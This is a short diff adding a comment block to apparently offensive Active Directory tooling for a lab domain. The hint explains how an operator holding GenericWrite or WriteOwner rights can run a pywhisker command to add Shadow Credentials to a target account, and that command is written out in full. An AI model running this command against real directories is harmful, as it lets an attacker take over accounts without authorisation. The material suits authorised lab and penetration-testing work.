@@ -1,0 +1,9 @@
+# Shadow Credentials viability hint (operator follow-up via enum-ldap.sh)
+#
+# If you discover GenericWrite or WriteOwner on a target user/computer object
+# (BloodHound owned-objects path or 'nxc ldap --bloodhound'):
+#
+#   pywhisker --target <victim-user> -d 'lab.local' \
+#             -u 'vagrant' -p '<PASS>' --dc-ip 10.0.0.10 --action add
+#
+# Pre-requisite: msDS-KeyCredentialLink is writable on the target.
